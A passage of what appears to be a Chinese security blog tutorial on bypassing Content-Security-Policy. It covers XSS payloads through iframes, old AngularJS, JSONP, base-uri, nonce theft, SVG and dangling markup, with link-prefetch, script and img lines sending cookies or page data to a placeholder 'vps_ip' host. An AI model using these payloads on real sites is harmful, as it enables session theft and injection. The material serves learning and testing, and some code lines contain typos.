<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">----SCP的限制</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-scr &apos;self&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----写死的外带link标签</span><br><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----不写死的外带link标签</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;,&quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;,&quot;//vps_ip?&quot;+document.cookie);</span><br><span class="line">documnet.head.appendChild(link);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X02-使用iframe绕过"><a href="#0X02-使用iframe绕过" class="headerlink" title="0X02 使用iframe绕过"></a>0X02 使用iframe绕过</h3><ul>
<li>背景：当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</li>
<li>利用条件<ul>
<li>一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞（存在XSS漏洞原因是需要执行JS代码）</li>
<li>我们需要的数据在存在CSP保护的页面</li>
</ul>
</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php  -&gt; A页面</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; script-src &apos;self&apos;&quot;&gt;</span><br><span class="line">&lt;h1 id=&quot;flag&quot;&gt;flag&#123;this_is_flag&#125;&lt;/h1&gt;</span><br><span class="line">---test1.www.xyz/3.php  -&gt; B页面</span><br><span class="line">//模拟XSS</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var iframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    iframe.src = &quot;1.php&quot;;</span><br><span class="line">    document.body.appenChild(iframe);</span><br><span class="line">    setTimeout(()=&gt;alert(iframe.contentView.document.getElementById(&apos;flag&apos;).innertHTML),1000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/scp/iframe-alert.png" alt="iframe-alert"></p>
<h3 id="OXO3-用CDN来绕过"><a href="#OXO3-用CDN来绕过" class="headerlink" title="OXO3 用CDN来绕过"></a>OXO3 用CDN来绕过</h3><ul>
<li>背景<ul>
<li>前端会用到许多的前端框架和库，引用到其他CDN上的JS框架</li>
<li>CDN上如果存在一些低版本的框架，就可能存在绕过CSP的风险</li>
</ul>
</li>
<li>利用条件<ul>
<li>CDN服务商存在某些低版本的js库</li>
<li>CDN服务商在CSP白名单中</li>
<li>调用CDN服务商的js库</li>
</ul>
</li>
<li>引用orange师傅采用了低版本的angular js模板注入来绕过CSP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- foo=&quot;--&gt;</span><br><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果用了Jquery-mobile库，且CSP中包含<code>&quot;script-src &#39;unsafe-eval&#39;&quot;或者&quot;script-src &#39;strict-dynamic&#39;&quot;</code>，可以用此exp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">低版本angular js的CDN服务商列表</a></li>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">库可以绕过CSP（来自blackhat2017）</a></li>
</ul>
<h3 id="0X04-站点可控静态资源绕过"><a href="#0X04-站点可控静态资源绕过" class="headerlink" title="0X04 站点可控静态资源绕过"></a>0X04 站点可控静态资源绕过</h3><ul>
<li>▲ 感觉跟CDN来绕过的方式有点像，都是调用外部的库或者包，然后可以引用</li>
<li>利用条件<ul>
<li>站点存在可控静态资源</li>
<li>站点在CSP白名单中</li>
</ul>
</li>
<li>例子<ul>
<li>如果前端的CSP中使用到了<a href="http://www.google-analytics.com" target="_blank" rel="noopener">www.google-analytics.com</a></li>
<li>而<a href="http://www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP" target="_blank" rel="noopener">www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</a></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//访问www.google.analytics.com自定义js的功能，会得到一个id</span><br><span class="line">function test()&#123;</span><br><span class="line">    return alert(&quot;here&quot;)</span><br><span class="line">&#125;</span><br><span class="line">----test1.www.xyz/1.php（将获得的id填入下面的链接中的id即可）</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://www.google-analytics.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点</li>
<li>▲ 2020.06.05 <a href="http://www.google.analytics.com暂无法进行访问" target="_blank" rel="noopener">www.google.analytics.com暂无法进行访问</a></li>
</ul>
<h3 id="0X05-站点可控JSONP绕过"><a href="#0X05-站点可控JSONP绕过" class="headerlink" title="0X05 站点可控JSONP绕过"></a>0X05 站点可控JSONP绕过</h3><ul>
<li>前提：大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析</li>
<li>利用条件<ul>
<li>站点存在可控Jsonp</li>
<li>站点在CSP白名单中</li>
</ul>
</li>
<li>例子：Google站点存在了用户可控jsonp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src https://www.google.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>▲ 配合注释，可以执行任意js</li>
<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">一些存在用户可控资源或者jsonp比较常用站点的github项目</a></li>
</ul>
<h3 id="0X06-Base-uri绕过"><a href="#0X06-Base-uri绕过" class="headerlink" title="0X06 Base-uri绕过"></a>0X06 Base-uri绕过</h3><blockquote>
<p>   无绝对路径的不完整资源</p>
</blockquote>
<ul>
<li>当服务器CSP的script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径</li>
<li>利用条件<ul>
<li>CSP中的script-src只使用nonce</li>
<li>没有额外设置base-uri</li>
<li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li>
</ul>
</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip/&quot;&gt;</span><br><span class="line">&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X07-不完整的script标签绕过nonce"><a href="#0X07-不完整的script标签绕过nonce" class="headerlink" title="0X07 不完整的script标签绕过nonce"></a>0X07 不完整的script标签绕过nonce</h3><ul>
<li>利用条件<ul>
<li>可控点在合法script标签上方,且其中没有其他标签</li>
<li>XSS页面的CSP的script-src只采用了nonce方式</li>
</ul>
</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;nonce-xxxx&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;script nonce=&apos;xxxx&apos;&gt;</span><br><span class="line">    //do some thing</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>输入<code>http://test1.www.xyz/1.php?xss=&lt;script src=data:text/plain,alert(1)</code>，即造成xss</li>
<li>解释：这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的<code>&lt;script</code>会变成一个属性，值为空，之后的nonce=’xxxxx’会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/nonce-example.png" alt="nonce-example"></p>
<ul>
<li>▲ 2020.06.05 本实验在Firefox上实验成功，在Chrome上不成功<ul>
<li>即使构造特殊的url<code>http://test1.www.xyz/1.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code>，也无法成功，还是会受到CSP影响</li>
<li>特殊的url解析：先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个<code>&lt;script</code>赋给了第二个a属性，浏览器在解析的时候直接忽略了第二个属性及其后面的值，这样Payload就能成功在chrome浏览器上执行</li>
<li>标签的一个技巧：当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</li>
</ul>
</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/nonce-chrome-error.png" alt="nonce-chrome-error"></p>
<h3 id="0X08-SVG绕过"><a href="#0X08-SVG绕过" class="headerlink" title="0X08 SVG绕过"></a>0X08 SVG绕过</h3><ul>
<li>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</li>
<li>利用条件<ul>
<li>可以上传svg图片</li>
</ul>
</li>
<li>1.svg</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/scp/svg-example.png" alt="svg-example"></p>
<h3 id="0X09-不完整的资源标签获取资源"><a href="#0X09-不完整的资源标签获取资源" class="headerlink" title="0X09 不完整的资源标签获取资源"></a>0X09 不完整的资源标签获取资源</h3><ul>
<li>利用条件<ul>
<li>可以加载外域资源（img-src: *）</li>
<li>需要获取页面某处的信息</li>
</ul>
</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;;img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class="line">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>注解：这里可以注意到img用了*，有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的<code>&lt;img</code>标签来将数据带出</li>
<li>浏览器访问：<code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//vps_ip?a=</code><ul>
<li>此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上</li>
</ul>
</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/img-example.png" alt="img-example"></p>
<ul>
<li>▲ 2020.06.05 此实验在Chrome上无法成功执行，因为chrome不允许发出的url中含有回车或<code>&lt;</code>，否者不会发出</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/img-chrome-error.png" alt="img-chrome-error"> </p>
<h3 id="0X10-CRLF绕过"><a href="#0X10-CRLF绕过" class="headerlink" title="0X10 CRLF绕过"></a>0X10 CRLF绕过</h3><ul>
<li>当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP</li>
</ul>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="https://xz.aliyun.com/t/5084#toc-11" target="_blank" rel="noopener">我的CSP绕过思路及总结</a></li>
<li><a href="http://sunu11.com/2019/12/13/learning-CSP/" target="_blank" rel="noopener">learning_CSP</a></li>
<li><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">A Wormable XSS on HackMD!</a></li>
</ul>

            </div>
          

    
      <footer class="post-footer">
		

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/08/20/linux_privilege_escalation/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">Linux提权</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/07/12/php_file_about/">
        <span class="next-text nav-default">php文件相关操作</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon"><span class="copyright-year">
    
        &copy;
    
        2019 -
    
    2020
    <span class="footer-author">Tomas.</span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
